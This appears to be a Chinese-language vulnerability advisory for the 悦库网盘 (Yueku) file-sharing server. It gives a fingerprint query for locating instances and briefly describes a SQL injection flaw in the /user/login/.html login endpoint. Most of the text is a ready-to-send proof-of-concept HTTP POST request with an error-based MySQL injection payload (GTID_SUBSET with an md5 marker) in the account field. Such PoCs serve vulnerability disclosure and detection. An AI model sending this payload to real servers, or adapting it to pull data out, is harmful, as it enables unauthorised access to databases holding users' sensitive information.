app="悦库-悦库网盘"

**一、漏洞简述**

悦库网盘官方版是一款界面简约直观、操作便捷轻松的网络共享工具。悦库网盘最新版功能强劲，基于悦库网盘服务端。通过悦库网盘客户端，用户可以登录任意一个局域网络内的服务器，下载或者上传文件，实现文件共享的功能，给大家带来了全新的网络共享感受。其接口/user/login/.html存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

**二、漏洞检测poc**

```yaml
POST /user/login/.html HTTP/1.1
Host: x.x.x.x
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Priority: u=1
Content-Length: 95

account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,md5(123456)))),0x7e),5597)-- HZLK
```

